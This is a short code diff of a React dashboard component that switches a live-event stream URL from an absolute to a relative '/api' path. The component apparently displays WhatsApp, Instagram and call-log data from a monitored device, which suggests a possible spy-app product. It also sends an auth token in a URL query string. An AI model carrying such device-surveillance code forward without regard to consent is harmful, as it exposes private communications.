@@ -1,5 +1,4 @@
 import { useEffect, useMemo, useRef, useState } from "react";
-import { apiClient } from "../api/client";
 import { devicesApi } from "../api/devices";
 import { downloadFileViaRelay } from "../api/fileDownload";
 import type { WhatsAppChatSummary, WhatsAppMessage, WhatsAppCallEntry, CallLogEntry, InstagramChatSummary, InstagramMessage } from "../api/types";
@@ -521,8 +520,10 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
     let eventSource: EventSource | null = null;
     try {
       const token = localStorage.getItem("spapp_token") || "";
-      const baseApi = apiClient.defaults.baseURL || "http://localhost:4000";
-      const sseUrl = `${baseApi}/api/devices/${deviceId}/events?token=${encodeURIComponent(token)}`;
+      // Relative path — same /api proxy (vercel.json rewrite / Vite dev
+      // server proxy) that apiClient's requests go through, so this is a
+      // same-origin request too.
+      const sseUrl = `/api/devices/${deviceId}/events?token=${encodeURIComponent(token)}`;
       eventSource = new EventSource(sseUrl);
 
       eventSource.onmessage = (event) => {
